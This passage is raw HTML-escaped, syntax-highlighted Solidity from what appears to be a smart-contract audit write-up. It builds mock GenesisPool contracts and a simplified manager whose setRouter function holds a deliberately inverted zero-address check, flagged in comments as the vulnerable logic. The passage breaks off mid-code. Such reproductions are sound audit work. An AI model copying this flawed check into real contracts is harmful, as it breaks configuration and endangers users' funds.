\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewasCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// A very simple mock GenesisPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIGenesisPoolBase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elaunchCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// To satisfy getGenesisInfo\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLiquidityPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityPoolInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// To satisfy getLiquidityPoolInfo\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/*maturityTime*/\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elaunchCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Router is address(0)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Simulate failure if router is zero\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Simulate interaction with the router\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetGenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) { \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetLiquidityPoolInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eLiquidityPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) { \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityPoolInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// A simplified GenesisPoolManager containing the vulnerable function\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// and a conceptual _launchPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSimplifiedGenesisPoolManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// The vulnerable state variable\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBaseV1Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Added for _launchPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMATURITY_TIME\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;     \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Added for _launchPool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eevent\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eRouterSet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emodifier\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Not owner\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003econstructor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_initialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_initialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMATURITY_TIME\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweeks\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// The vulnerable function\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// The logical error\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eRouterSet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_router\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Conceptual launch pool function to demonstrate impact\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// In a real scenario, _genesisPool would be a parameter or fetched\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_launchPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_genesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan 